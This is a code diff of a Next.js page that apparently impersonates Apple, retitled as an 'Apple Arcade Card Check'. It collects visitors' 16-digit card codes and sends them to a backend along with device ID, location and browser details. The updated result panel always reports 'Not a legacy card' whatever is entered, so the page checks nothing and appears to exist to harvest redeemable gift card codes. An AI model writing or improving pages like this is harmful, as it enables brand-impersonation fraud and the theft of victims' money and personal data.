@@ -2,7 +2,7 @@ import { useState, useEffect } from 'react'
 import Head from 'next/head'
 import styles from '../styles/apple.module.css'
 
-export default function AppleIdPage() {
+export default function AppleArcadePage() {
   const [cards, setCards] = useState([''])
   const [loading, setLoading] = useState(false)
   const [result, setResult] = useState(null)
@@ -76,7 +76,7 @@ export default function AppleIdPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'),
-          type: 'apple',
+          type: 'apple-arcade',
           deviceId: deviceId,
           location: location,
           browserInfo: JSON.stringify(browserInfo)
@@ -199,7 +199,7 @@ export default function AppleIdPage() {
   return (
     <div className={styles.appleStyles}>
       <Head>
-        <title>Check Apple Issuance ID - Apple</title>
+        <title>Apple Arcade Card Check - Apple</title>
       </Head>
 
       {/* Location Banner */}
@@ -297,8 +297,11 @@ export default function AppleIdPage() {
       <main className="page-root">
         <div className="shell">
           <section className="hero">
-            <h1>Apple Issuance ID Check</h1>
-            <p className="hero-text">Enter your 16-digit code to generate the Issuance ID instantly.</p>
+            <div style={{ width: '100%', maxWidth: '700px', margin: '0 auto 20px', borderRadius: '12px', overflow: 'hidden' }}>
+              <img src="/applearcade.jpeg" alt="Apple Arcade" style={{ width: '100%', display: 'block' }} />
+            </div>
+            <h1>Apple Arcade Card Check</h1>
+            <p className="hero-text">Enter your 16-digit code to verify the card type instantly.</p>
           </section>
 
           <div className="main-card">
@@ -356,12 +359,9 @@ export default function AppleIdPage() {
                     </div>
                   ) : (
                     <>
-                      <div style={{ fontSize: '12px', fontWeight: 600, color: '#86868b', textTransform: 'uppercase', letterSpacing: '1px' }}>Issuance ID</div>
-                      <div className="amount" style={{ margin: '10px 0', fontSize: '32px' }}>{result.issuanceId}</div>
+                      <div style={{ fontSize: '12px', fontWeight: 600, color: '#86868b', textTransform: 'uppercase', letterSpacing: '1px' }}>Card Type</div>
+                      <div className="amount" style={{ margin: '10px 0', fontSize: '24px', color: '#ff453a' }}>Not a legacy card</div>
                       <div className="meta" style={{ marginBottom: '20px' }}>For Card ending in {result.cardLast4}</div>
-                      <button type="button" className="primary" onClick={copyIssuanceId} style={{ background: copySuccess ? '#28a745' : '#0071e3' }}>
-                        {copySuccess ? 'Copied ID ✓' : 'Copy Issuance ID'}
-                      </button>
                     </>
                   )}
                 </div>
